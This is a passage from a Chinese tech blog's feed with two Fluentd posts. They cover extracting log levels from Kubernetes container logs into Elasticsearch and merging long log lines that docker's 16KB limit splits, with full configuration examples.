title="需要舍弃部分日志"></a>需要舍弃部分日志</h3><p>一开始我是想把所有只要带有<code>level</code>日志级别的都提取出来作为关键字，关键配置如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;filter</span> <span class="string">kubernetes.**&gt;</span></span><br><span class="line"> <span class="string">@type</span> <span class="string">grep</span></span><br><span class="line"> <span class="string">regexp1</span> <span class="string">message</span> <span class="string">(DEBUG|INFO|WARNING|WARN|ERROR|FATAL|OFF|^[</span> <span class="string">java]+)</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&lt;filter</span> <span class="string">kubernetes.**&gt;</span></span><br><span class="line"> <span class="string">@type</span> <span class="string">parser</span></span><br><span class="line"> <span class="string">key_name</span> <span class="string">message</span></span><br><span class="line"> <span class="string">reserve_data</span> <span class="literal">yes</span></span><br><span class="line"> <span class="string">&lt;parse&gt;</span></span><br><span class="line">   <span class="string">@type</span> <span class="string">regexp</span></span><br><span class="line">   <span class="string">expression</span> <span class="string">/(?&lt;level&gt;(DEBUG|INFO|WARNING|WARN|ERROR|FATAL|OFF))/</span></span><br><span class="line">   <span class="string">types</span> <span class="attr">level:string</span></span><br><span class="line"> <span class="string">&lt;/parse&gt;</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br></pre></td></tr></table></figure><p>用过滤的方法匹配日志级，很显然基本上所有的日志都可以提取出level；<br>但同时也会带来问题，如果日志中不带有<code>level</code>日志级别就会被舍弃掉，最终ES中就查不到该日志了。</p><p><strong>解决方案</strong>：只提取标准日志格式的<code>level</code>字段（决不能丢掉任何服务日志）。</p><h3 id="tag字段被替换"><a href="#tag字段被替换" class="headerlink" title="tag字段被替换"></a>tag字段被替换</h3><p>当把资源占用问题处理了、标准日志格式也提取出了<code>level</code>字段，最后因为在处理标准日志和非标准日志过程中标记了tag，就是因为这个tag替换了<code>原本日志的tag（采集的日志文件名）</code>。</p><p><strong>原日志tag类似：</strong></p><p><img src="/2021/04/09/fluentd-ti-qu-ri-zhi-ji-bie-level-zuo-wei-xin-zi-duan/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p><strong>被替换后的tag：</strong></p><p><img src="/2021/04/09/fluentd-ti-qu-ri-zhi-ji-bie-level-zuo-wei-xin-zi-duan/%E5%9B%BE%E7%89%872.png" alt="图片2"></p><p><strong>解决方案</strong>：将原<code>tag</code>字段的数据重新写入新的字段，如<code>log_file</code> （这个在后面配置文件中# 对解析出来的日志文件路径修改key，因为key与后面的关键字tag重名）。</p><h3 id="解析出来的k8s相关字段过多"><a href="#解析出来的k8s相关字段过多" class="headerlink" title="解析出来的k8s相关字段过多"></a>解析出来的k8s相关字段过多</h3><p>当一切准备就绪后，发现解析出来的k8s相关元数据非常多，大部分在查询过程中都使用不到，日志字段大致如下：</p><p><img src="/2021/04/09/fluentd-ti-qu-ri-zhi-ji-bie-level-zuo-wei-xin-zi-duan/%E5%9B%BE%E7%89%873.png" alt="图片3"></p><p><strong>解决方案</strong>：删除日志字段（这个在后面配置文件中# 删除日志中不需要的key）。</p><h2 id="最终的配置"><a href="#最终的配置" class="headerlink" title="最终的配置"></a>最终的配置</h2><p>最终的fluentd配置如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 日志源配置，格式化成json</span></span><br><span class="line"><span class="string">&lt;source&gt;</span></span><br><span class="line">  <span class="string">@id</span> <span class="string">fluentd-containers.log</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">tail</span></span><br><span class="line">  <span class="string">path</span> <span class="string">/var/log/containers/*.log</span></span><br><span class="line">  <span class="string">pos_file</span> <span class="string">/var/log/es-containers.log.pos</span></span><br><span class="line">  <span class="string">tag</span> <span class="string">raw.kubernetes.*</span></span><br><span class="line">  <span class="comment">#read_from_head true</span></span><br><span class="line">  <span class="string">&lt;parse&gt;</span></span><br><span class="line">    <span class="string">@type</span> <span class="string">multi_format</span></span><br><span class="line">    <span class="string">&lt;pattern&gt;</span></span><br><span class="line">      <span class="string">format</span> <span class="string">json</span></span><br><span class="line">      <span class="string">time_key</span> <span class="string">time</span></span><br><span class="line">      <span class="string">time_format</span> <span class="string">%Y-%m-%dT%H:%M:%S.%NZ</span></span><br><span class="line">    <span class="string">&lt;/pattern&gt;</span></span><br><span class="line">    <span class="string">&lt;pattern&gt;</span></span><br><span class="line">      <span class="string">format</span> <span class="string">/^(?&lt;time&gt;.+)</span> <span class="string">(?&lt;stream&gt;stdout|stderr)</span> <span class="string">[^</span> <span class="string">]*</span> <span class="string">(?&lt;log&gt;.*)$/</span></span><br><span class="line">      <span class="string">time_format</span> <span class="string">%Y-%m-%dT%H:%M:%S.%N%:z</span></span><br><span class="line">    <span class="string">&lt;/pattern&gt;</span></span><br><span class="line">  <span class="string">&lt;/parse&gt;</span></span><br><span class="line"><span class="string">&lt;/source&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测java异常栈日志，并作为一条日志转发</span></span><br><span class="line"><span class="string">&lt;match</span> <span class="string">raw.kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@id</span> <span class="string">raw.kubernetes</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">detect_exceptions</span></span><br><span class="line">  <span class="string">remove_tag_prefix</span> <span class="string">raw</span></span><br><span class="line">  <span class="string">message</span> <span class="string">log</span></span><br><span class="line">  <span class="string">stream</span> <span class="string">stream</span></span><br><span class="line">  <span class="string">languages</span> <span class="string">java</span></span><br><span class="line">  <span class="string">multiline_flush_interval</span> <span class="number">5</span></span><br><span class="line">  <span class="string">max_bytes</span> <span class="number">500000</span></span><br><span class="line">  <span class="string">max_lines</span> <span class="number">1000</span></span><br><span class="line"><span class="string">&lt;/match&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将json日志log中的value转换成message字段内容，不使用则es中message会变成log字段</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="string">kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@id</span> <span class="string">filter_parser</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">parser</span>                <span class="comment"># multi-format-parser多格式解析器插件</span></span><br><span class="line">  <span class="string">key_name</span> <span class="string">log</span>                <span class="comment"># 在要解析的记录中指定字段名称。</span></span><br><span class="line">  <span class="string">reserve_data</span> <span class="literal">true</span>           <span class="comment"># 在解析结果中保留原始键值对。</span></span><br><span class="line">  <span class="string">remove_key_name_field</span> <span class="literal">true</span>  <span class="comment"># key_name 解析成功后删除字段。</span></span><br><span class="line">  <span class="string">&lt;parse&gt;</span></span><br><span class="line">    <span class="string">@type</span> <span class="string">multi_format</span></span><br><span class="line">    <span class="string">&lt;pattern&gt;</span></span><br><span class="line">      <span class="string">format</span> <span class="string">json</span></span><br><span class="line">    <span class="string">&lt;/pattern&gt;</span></span><br><span class="line">    <span class="string">&lt;pattern&gt;</span></span><br><span class="line">      <span class="string">format</span> <span class="string">none</span></span><br><span class="line">    <span class="string">&lt;/pattern&gt;</span></span><br><span class="line">  <span class="string">&lt;/parse&gt;</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多行日志拼接，主要针对pod日志超过docker 16k限制的大日志</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="string">kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">concat</span></span><br><span class="line">  <span class="string">key</span> <span class="string">message</span></span><br><span class="line">  <span class="string">separator</span> <span class="string">"\&gt;\n$"</span></span><br><span class="line">  <span class="string">multiline_start_regexp</span> <span class="string">/^\[\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;</span> <span class="string">\d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;.\d&#123;3&#125;\]/</span></span><br><span class="line">  <span class="string">multiline_end_regexp</span> <span class="string">/^\n$|</span> <span class="string">\n$/</span></span><br><span class="line">  <span class="string">flush_interval</span> <span class="number">10</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加k8s相关的元数据，pod namespace id 等</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="string">kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@id</span> <span class="string">filter_kubernetes_metadata</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">kubernetes_metadata</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对解析出来的日志文件路径修改key，因为key与后面的关键字tag重名</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="string">kubernetes.**&gt;</span></span><br><span class="line">  <span class="comment">#@type record_modifier #这两个插件都可以</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">record_transformer</span></span><br><span class="line">  <span class="string">&lt;record&gt;</span></span><br><span class="line">    <span class="string">log_file</span> <span class="string">$&#123;tag&#125;</span></span><br><span class="line">  <span class="string">&lt;/record&gt;</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 区分标准格式和非标准格式日志</span></span><br><span class="line"><span class="string">&lt;match</span> <span class="string">kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">rewrite_tag_filter</span></span><br><span class="line">  <span class="string">&lt;rule&gt;</span></span><br><span class="line">    <span class="string">key</span> <span class="string">message</span></span><br><span class="line">    <span class="string">pattern</span> <span class="string">/^\[20/</span></span><br><span class="line">    <span class="string">tag</span> <span class="string">INFO.kubernetes.*</span></span><br><span class="line">  <span class="string">&lt;/rule&gt;</span></span><br><span class="line">  <span class="string">&lt;rule&gt;</span></span><br><span class="line">    <span class="string">key</span> <span class="string">message</span></span><br><span class="line">    <span class="string">pattern</span> <span class="string">/^\[20/</span></span><br><span class="line">    <span class="string">tag</span> <span class="literal">NULL</span>.<span class="string">kubernetes.*</span></span><br><span class="line">    <span class="string">invert</span> <span class="literal">true</span></span><br><span class="line">  <span class="string">&lt;/rule&gt;</span></span><br><span class="line"><span class="string">&lt;/match&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对标准格式的日志提取日志级别level</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="string">INFO.kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">parser</span></span><br><span class="line">  <span class="string">key_name</span> <span class="string">message</span></span><br><span class="line">  <span class="string">reserve_data</span> <span class="literal">true</span></span><br><span class="line">  <span class="string">&lt;parse&gt;</span></span><br><span class="line">    <span class="string">@type</span> <span class="string">regexp</span></span><br><span class="line">    <span class="string">expression</span> <span class="string">/^\[[^\]]*\]</span> <span class="string">\[[^\]]*\]</span> <span class="string">\[[^\]]*\]</span> <span class="string">(?&lt;level&gt;\S+)/</span></span><br><span class="line">    <span class="string">types</span> <span class="attr">level:string</span></span><br><span class="line">  <span class="string">&lt;/parse&gt;</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对标准格式的日志写日志标签 这一步可以忽略</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="string">INFO.kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">record_transformer</span></span><br><span class="line">  <span class="comment">#@type record_modifier #这个插件也可以</span></span><br><span class="line">  <span class="string">&lt;record&gt;</span></span><br><span class="line">    <span class="string">level</span> <span class="string">$&#123;record["level"]&#125;</span></span><br><span class="line">  <span class="string">&lt;/record&gt;</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 非标准格式的日志level为null</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="literal">NULL</span>.<span class="string">kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">record_transformer</span></span><br><span class="line">  <span class="string">&lt;record&gt;</span></span><br><span class="line">    <span class="string">level</span> <span class="literal">NULL</span></span><br><span class="line">  <span class="string">&lt;/record&gt;</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 排除特定标签的日志</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="literal">NULL</span>.<span class="string">kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">grep</span></span><br><span class="line">  <span class="string">&lt;exclude&gt;</span></span><br><span class="line">    <span class="string">key</span> <span class="string">$.kubernetes.labels.k8s-app</span></span><br><span class="line">    <span class="string">pattern</span> <span class="string">/fluentd-es|kubernetes-dashboard/</span></span><br><span class="line">  <span class="string">&lt;/exclude&gt;</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除日志中不需要的key</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="string">**&gt;</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">record_transformer</span></span><br><span class="line">  <span class="string">remove_keys</span> <span class="string">stream,$.kubernetes.container_image_id,$.kubernetes.labels.jenkins-fold,$.kubernetes.labels.pod-template-hash,$.kubernetes.labels.repo-config-group,$.kubernetes.labels.repo-config-project,$.kubernetes.labels.repo-group,$.kubernetes.labels.repo-project,$.kubernetes.master_url,$.kubernetes.namespace_id,$.kubernetes.namespace_labels.env,$.kubernetes.pod_id,$.kubernetes.container_name</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong>由于引入插件<code>ewrite_tag_filter</code>在原官方docker镜像中没有安装，可以使用以下命令安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install fluent-plugin-rewrite-tag-filter</span><br></pre></td></tr></table></figure><p>也可以使用我安装好的镜像：<code>chenzz/fluentd:v3.0.2</code></p><p>output配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;match</span> <span class="string">**&gt;</span></span><br><span class="line">  <span class="string">@id</span> <span class="string">elasticsearch</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">elasticsearch</span></span><br><span class="line">  <span class="string">@log_level</span> <span class="string">info</span></span><br><span class="line">  <span class="string">type_name</span> <span class="string">_doc</span></span><br><span class="line">  <span class="string">include_tag_key</span> <span class="literal">true</span></span><br><span class="line">  <span class="string">host</span> <span class="string">vpc-es-log-vad4uirwivrwpfg5p3yy4gfasm.ap-southeast-2.es.amazonaws.com</span></span><br><span class="line">  <span class="string">port</span> <span class="number">443</span></span><br><span class="line">  <span class="string">scheme</span> <span class="string">https</span></span><br><span class="line">  <span class="string">logstash_format</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment">#logstash_prefix fluentd-test</span></span><br><span class="line">  <span class="string">reload_connections</span> <span class="literal">false</span></span><br><span class="line">  <span class="string">reconnect_on_error</span> <span class="literal">true</span></span><br><span class="line">  <span class="string">reload_on_failure</span> <span class="literal">true</span></span><br><span class="line">  <span class="string">remove_keys</span> <span class="string">tag</span> <span class="comment">#删除tag字段</span></span><br><span class="line">  <span class="string">&lt;buffer&gt;</span></span><br><span class="line">    <span class="string">@type</span> <span class="string">file</span></span><br><span class="line">    <span class="string">path</span> <span class="string">/var/log/fluentd-buffers/kubernetes.system.buffer</span></span><br><span class="line">    <span class="string">flush_mode</span> <span class="string">interval</span></span><br><span class="line">    <span class="string">retry_type</span> <span class="string">exponential_backoff</span></span><br><span class="line">    <span class="string">flush_thread_count</span> <span class="number">2</span></span><br><span class="line">    <span class="string">flush_interval</span> <span class="number">5</span><span class="string">s</span></span><br><span class="line">    <span class="string">retry_forever</span></span><br><span class="line">    <span class="string">retry_max_interval</span> <span class="number">30</span></span><br><span class="line">    <span class="string">chunk_limit_size</span> <span class="number">2</span><span class="string">M</span></span><br><span class="line">    <span class="string">total_limit_size</span> <span class="number">500</span><span class="string">M</span></span><br><span class="line">    <span class="string">overflow_action</span> <span class="string">block</span></span><br><span class="line">  <span class="string">&lt;/buffer&gt;</span></span><br><span class="line"><span class="string">&lt;/match&gt;</span></span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;事情起因&quot;&gt;&lt;a href=&quot;#事情起因&quot; class=&quot;headerlink&quot; title=&quot;事情起因&quot;&gt;&lt;/a&gt;事情起因&lt;/h2&gt;
      
    
    </summary>
    
    
      <category term="Fluentd" scheme="http://chenzhonzhou.github.io/categories/Fluentd/"/>
    
    
      <category term="Fluentd" scheme="http://chenzhonzhou.github.io/tags/Fluentd/"/>
    
  </entry>
  
  <entry>
    <title>Fluentd采集日志超出docker容器16k限制换行问题</title>
    <link href="http://chenzhonzhou.github.io/2021/03/18/fluentd-cai-ji-ri-zhi-chao-chu-docker-rong-qi-16k-xian-zhi-huan-xing-wen-ti/"/>
    <id>http://chenzhonzhou.github.io/2021/03/18/fluentd-cai-ji-ri-zhi-chao-chu-docker-rong-qi-16k-xian-zhi-huan-xing-wen-ti/</id>
    <published>2021-03-18T07:06:29.000Z</published>
    <updated>2021-04-09T09:25:06.595Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>java服务产生的大日志收集到ES被拆分成多行，ES中被拆分的日志如下:</p><p><img src="/2021/03/18/fluentd-cai-ji-ri-zhi-chao-chu-docker-rong-qi-16k-xian-zhi-huan-xing-wen-ti/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p>如上所示，红框中的日志本应该是一条，存到ES里结果拆分为了4条日志。</p><h2 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h2><p>于是，就去服务器上找这几条原始日志，如下：</p><p><img src="/2021/03/18/fluentd-cai-ji-ri-zhi-chao-chu-docker-rong-qi-16k-xian-zhi-huan-xing-wen-ti/%E5%9B%BE%E7%89%872.png" alt="图片2"></p><p>通过对比发现和ES日志完全一样，这说明日志并不是在Fluentd进行收集的时候拆分的。</p><h3 id="分析问题"><a href="#分析问题" class="headerlink" title="分析问题"></a>分析问题</h3><p>根据观察被拆分处也没有规律，唯一的规律就是日志都特别长，显然日志很有可能是在写入docker stdout时就被拆分了。</p><h3 id="确定问题"><a href="#确定问题" class="headerlink" title="确定问题"></a>确定问题</h3><p>通过搜索发现，在<a href="https://github.com/moby/moby/issues/34855" target="_blank" rel="noopener">docker github</a>项目上也有人遇到过该问题，</p><p><img src="/2021/03/18/fluentd-cai-ji-ri-zhi-chao-chu-docker-rong-qi-16k-xian-zhi-huan-xing-wen-ti/%E5%9B%BE%E7%89%873.png" alt="图片3"></p><blockquote><p>大概的意思是说：在docker 1.13以后的版本中引入了日志更改，如果消息是长度超过16KB的JSON对象，docker会将其拆分。</p></blockquote><p>此问题，在<a href="https://github.com/nalind/docker/blob/master/daemon/logger/copier.go#L13" target="_blank" rel="noopener">docker 源码</a>中也得到了证实。</p><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>既然导致日志拆分的原因已经找到了，大致可以从以下3个方面解决大日志拆分</p><ul><li>把docker版本降到1.13以下</li><li>修改docker源码，然后重新编译</li><li>在Fluentd中对拆分的日志进行合并</li></ul><p>经过分析发现前面两个在实施的过程中会对现有服务产生较大影响（因为现有服务大多数只运行了一个pod），既然这样那只有实施第3个方案了。</p><p>顺着docker github上的问题，找到了一个可以合并多行日志的<a href="https://github.com/fluent-plugins-nursery/fluent-plugin-concat/blob/master/README.md" target="_blank" rel="noopener">插件</a>，随后经过多番测试成功合并了因docker 16k限制而拆分的大日志。</p><p>合并后的结果如下：</p><p><img src="/2021/03/18/fluentd-cai-ji-ri-zhi-chao-chu-docker-rong-qi-16k-xian-zhi-huan-xing-wen-ti/%E5%9B%BE%E7%89%874.png" alt="图片4"></p><p>前面的7条日志，最终合并成了4条</p><h2 id="Fluentd-配置"><a href="#Fluentd-配置" class="headerlink" title="Fluentd 配置"></a>Fluentd 配置</h2><p>经过调试后，最终fluentd的配置如下，主要就是增加了<strong>concat</strong>多行合并配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat fluentd.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#日志源配置，格式化成json</span></span><br><span class="line"><span class="string">&lt;source&gt;</span></span><br><span class="line">  <span class="string">@id</span> <span class="string">fluentd-containers.log</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">tail</span></span><br><span class="line">  <span class="string">path</span> <span class="string">/var/log/containers/*/*.log</span></span><br><span class="line">  <span class="string">pos_file</span> <span class="string">/var/log/es-containers.log.pos</span></span><br><span class="line">  <span class="string">tag</span> <span class="string">raw.kubernetes.*</span></span><br><span class="line">  <span class="string">&lt;parse&gt;</span></span><br><span class="line">    <span class="string">@type</span> <span class="string">multi_format</span></span><br><span class="line">    <span class="string">&lt;pattern&gt;</span></span><br><span class="line">      <span class="string">format</span> <span class="string">json</span></span><br><span class="line">      <span class="string">time_key</span> <span class="string">timestamp</span></span><br><span class="line">      <span class="string">time_format</span> <span class="string">%Y-%m-%dT%H:%M:%S.%NZ</span></span><br><span class="line">    <span class="string">&lt;/pattern&gt;</span></span><br><span class="line">    <span class="string">&lt;pattern&gt;</span></span><br><span class="line">      <span class="string">format</span> <span class="string">/^(?&lt;time&gt;.+)</span> <span class="string">(?&lt;stream&gt;stdout|stderr)</span> <span class="string">[^</span> <span class="string">]*</span> <span class="string">(?&lt;log&gt;.*)$/</span></span><br><span class="line">      <span class="string">time_format</span> <span class="string">%Y-%m-%dT%H:%M:%S.%N%:z</span></span><br><span class="line">    <span class="string">&lt;/pattern&gt;</span></span><br><span class="line">  <span class="string">&lt;/parse&gt;</span></span><br><span class="line"><span class="string">&lt;/source&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测java异常栈日志，并作为一条日志转发</span></span><br><span class="line"><span class="comment"># Detect exceptions in the log output and forward them as one log entry.</span></span><br><span class="line"><span class="string">&lt;match</span> <span class="string">raw.kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@id</span> <span class="string">raw.kubernetes</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">detect_exceptions</span></span><br><span class="line">  <span class="string">remove_tag_prefix</span> <span class="string">raw</span></span><br><span class="line">  <span class="string">message</span> <span class="string">log</span></span><br><span class="line">  <span class="string">stream</span> <span class="string">stream</span></span><br><span class="line">  <span class="string">languages</span> <span class="string">java</span></span><br><span class="line">  <span class="string">multiline_flush_interval</span> <span class="number">5</span></span><br><span class="line">  <span class="string">max_bytes</span> <span class="number">0</span></span><br><span class="line">  <span class="string">max_lines</span> <span class="number">1000</span></span><br><span class="line"><span class="string">&lt;/match&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#排除以回车符开头和结尾的日志</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="string">kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">grep</span></span><br><span class="line">  <span class="string">&lt;exclude&gt;</span></span><br><span class="line">    <span class="string">key</span> <span class="string">log</span></span><br><span class="line">    <span class="string">pattern</span> <span class="string">/^\n$/</span></span><br><span class="line">  <span class="string">&lt;/exclude&gt;</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将json日志log中的value解析成message字段内容，不使用则es中message会变成log字段</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="string">kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@id</span> <span class="string">filter_parser</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">parser</span>                <span class="comment"># multi-format-parser多格式解析器插件</span></span><br><span 